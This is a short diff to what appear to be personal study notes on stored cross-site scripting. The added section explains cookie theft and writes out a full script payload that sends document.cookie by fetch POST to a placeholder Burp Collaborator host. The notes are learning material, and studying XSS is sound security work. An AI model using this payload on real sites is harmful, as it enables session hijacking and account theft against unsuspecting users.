@@ -14,4 +14,14 @@ an application displaying a Twitter feed might process data contained in third-p
 1. direct stored xss with nothing encoded
 in rthis attack we can directly store our malicios javascript and it will be stored
 
+2. stored XSS to steal user cookie using fetch method 
+so we can use paylaod like this:
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script> we can also try to use different payload than this
+
 
